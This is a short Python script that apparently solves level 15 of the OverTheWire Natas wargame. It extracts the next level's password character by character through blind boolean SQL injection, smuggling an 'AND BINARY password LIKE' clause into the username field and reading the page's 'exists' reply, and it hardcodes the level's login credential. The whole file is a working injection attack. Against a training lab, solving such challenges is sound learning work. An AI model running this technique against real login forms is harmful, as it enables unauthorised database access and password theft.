import requests
import re #regular expressions

username = "natas15"
password = "GB6USCJYJjwLyYhZUNkE1NwDueiTow6g"

url = 'http://%s.natas.labs.overthewire.org/' % username
charset="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
extracted_password = ""

print("Starting password scan.")

for position in range(1,33):
    for char in charset:

        data = {'username':f'natas16" AND BINARY password LIKE "{extracted_password}{char}%',"submit":"Check existence"}

        response = requests.post(url, auth = (username,password), data = data)

        if "exists" in response.text:
            extracted_password += char
            print(f"Password so far: {extracted_password}")
            break

print (f"Final Password: {extracted_password}")
#print (re.findall("natas15 is (.*)<br>",content)[0])
